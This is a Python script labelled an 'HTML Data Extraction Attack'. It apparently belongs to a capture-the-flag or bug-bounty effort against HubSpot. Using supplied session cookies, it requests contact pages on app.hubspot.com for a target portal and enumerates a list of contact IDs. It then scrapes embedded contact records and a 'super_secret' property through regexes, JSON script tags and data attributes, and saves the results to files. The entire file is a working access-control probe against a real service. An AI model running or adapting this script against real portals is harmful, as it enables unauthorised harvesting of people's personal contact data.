#!/usr/bin/env python3
"""
Extract contact data from HTML pages
Since session cookies allow us to load contact pages (200 status),
the contact data might be embedded in the HTML/JavaScript
"""

import requests
import json
import os
import re
import urllib3
from dotenv import load_dotenv
from bs4 import BeautifulSoup

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("HTML Data Extraction Attack")
print("="*80)
print("\nFetching contact pages and extracting embedded data...")
print("="*80)

headers = {
    'Cookie': SESSION_COOKIES,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}

# Try multiple contact IDs
contact_ids = [1, 2, 3, 5, 10, 100, 1000, 51, 101]

findings = []

for cid in contact_ids:
    url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{cid}'

    try:
        print(f"\n[*] Fetching contact {cid}...")
        r = requests.get(url, headers=headers, verify=False, timeout=15)

        if r.status_code != 200:
            print(f"  Status: {r.status_code} - Skipping")
            continue

        print(f"  Status: 200 - Page loaded ({len(r.text)} bytes)")
        html = r.text

        # ====================================================================
        # METHOD 1: Look for JSON data in <script> tags
        # ====================================================================

        # Common patterns where contact data might be embedded
        patterns = [
            r'window\.__INITIAL_STATE__\s*=\s*({.*?});',
            r'window\.__CONTACT_DATA__\s*=\s*({.*?});',
            r'window\.INITIAL_PROPS\s*=\s*({.*?});',
            r'contactData\s*:\s*({.*?})[,}]',
            r'properties\s*:\s*({.*?super_secret.*?})',
            r'"properties"\s*:\s*({.*?})',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, html, re.DOTALL | re.IGNORECASE)
            for match in matches:
                try:
                    # Try to parse as JSON
                    data = json.loads(match)

                    # Check if it contains contact properties
                    data_str = json.dumps(data).lower()
                    if 'super_secret' in data_str or 'firstname' in data_str:
                        print(f"\n  *** FOUND DATA IN SCRIPT TAG! ***")
                        print(f"  Contact ID: {cid}")
                        print(f"  Pattern: {pattern[:50]}")
                        print(f"\n{json.dumps(data, indent=2)[:1000]}")

                        findings.append({
                            'contact_id': cid,
                            'method': 'script_tag',
                            'pattern': pattern,
                            'data': data
                        })
                except:
                    pass

        # ====================================================================
        # METHOD 2: Look for direct property values
        # ====================================================================

        # Search for super_secret value directly
        secret_patterns = [
            r'super_secret["\']?\s*[:=]\s*["\']([^"\'<>]+)["\']',
            r'"super_secret"\s*:\s*{\s*"value"\s*:\s*"([^"]+)"',
            r'property-super_secret.*?value["\']?\s*[:=]\s*["\']([^"\'<>]+)["\']',
        ]

        for pattern in secret_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            if matches:
                print(f"\n  *** FOUND super_secret VALUE! ***")
                print(f"  Contact ID: {cid}")
                print(f"  Pattern: {pattern[:50]}")
                for match in matches:
                    print(f"  Value: {match}")
                    findings.append({
                        'contact_id': cid,
                        'method': 'regex_extraction',
                        'property': 'super_secret',
                        'value': match
                    })

        # Search for firstname
        name_patterns = [
            r'firstname["\']?\s*[:=]\s*["\']([^"\'<>]+)["\']',
            r'"firstname"\s*:\s*{\s*"value"\s*:\s*"([^"]+)"',
        ]

        firstname_found = None
        for pattern in name_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            if matches:
                firstname_found = matches[0]
                print(f"  Found firstname: {firstname_found}")

        # ====================================================================
        # METHOD 3: Parse with BeautifulSoup
        # ====================================================================

        soup = BeautifulSoup(html, 'html.parser')

        # Look for script tags with type="application/json"
        json_scripts = soup.find_all('script', {'type': 'application/json'})
        for script in json_scripts:
            try:
                data = json.loads(script.string)
                data_str = json.dumps(data).lower()

                if 'super_secret' in data_str or 'firstname' in data_str:
                    print(f"\n  *** FOUND DATA IN JSON SCRIPT! ***")
                    print(f"  Contact ID: {cid}")
                    print(f"\n{json.dumps(data, indent=2)[:1000]}")

                    findings.append({
                        'contact_id': cid,
                        'method': 'json_script',
                        'data': data
                    })
            except:
                pass

        # ====================================================================
        # METHOD 4: Check data attributes
        # ====================================================================

        elements_with_data = soup.find_all(attrs={'data-contact': True})
        elements_with_data += soup.find_all(attrs={'data-properties': True})
        elements_with_data += soup.find_all(attrs={'data-record': True})

        for elem in elements_with_data:
            for attr in elem.attrs:
                if attr.startswith('data-'):
                    value = elem[attr]
                    if 'super_secret' in str(value).lower():
                        print(f"\n  *** FOUND IN DATA ATTRIBUTE! ***")
                        print(f"  Contact ID: {cid}")
                        print(f"  Attribute: {attr}")
                        print(f"  Value: {value[:500]}")

                        findings.append({
                            'contact_id': cid,
                            'method': 'data_attribute',
                            'attribute': attr,
                            'value': value
                        })

        # ====================================================================
        # METHOD 5: Save HTML for manual inspection if interesting
        # ====================================================================

        if 'super_secret' in html.lower():
            print(f"\n  *** HTML contains 'super_secret' string! ***")
            filename = f'/home/user/Hub/findings/contact_{cid}_html.txt'

            # Extract surrounding context
            matches = re.finditer(r'.{200}super_secret.{200}', html, re.IGNORECASE | re.DOTALL)
            with open(filename, 'w') as f:
                f.write(f"Contact {cid} - Occurrences of 'super_secret':\n\n")
                for i, match in enumerate(matches, 1):
                    f.write(f"\n{'='*80}\n")
                    f.write(f"Occurrence {i}:\n")
                    f.write(f"{'='*80}\n")
                    f.write(match.group(0))
                    f.write(f"\n\n")

            print(f"  Saved context to: {filename}")

    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

print("\n" + "="*80)
print("HTML Extraction Complete")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL DATA EXTRACTIONS ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"\n{i}. Contact {finding['contact_id']} - Method: {finding['method']}")
        print(f"   {json.dumps(finding, indent=3)[:500]}")

    # Save findings
    with open('/home/user/Hub/findings/html_extraction.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("\n" + "="*80)
    print("SAVED: findings/html_extraction.json")
    print("="*80)

    # Check if we found the CTF flag
    for finding in findings:
        data_str = json.dumps(finding).lower()
        if 'super_secret' in data_str and TARGET_PORTAL in json.dumps(finding):
            print("\n" + "="*80)
            print("*** POTENTIAL CTF FLAG FOUND! ***")
            print("="*80)
            print(json.dumps(finding, indent=2))
            print("="*80)
else:
    print("\nNo contact data found in HTML.")
    print("\nThis could mean:")
    print("  - Contact data is loaded via XHR after page load")
    print("  - Data is in encrypted/obfuscated form")
    print("  - No contacts exist at tested IDs")
    print("  - Account doesn't have read permission even with session")
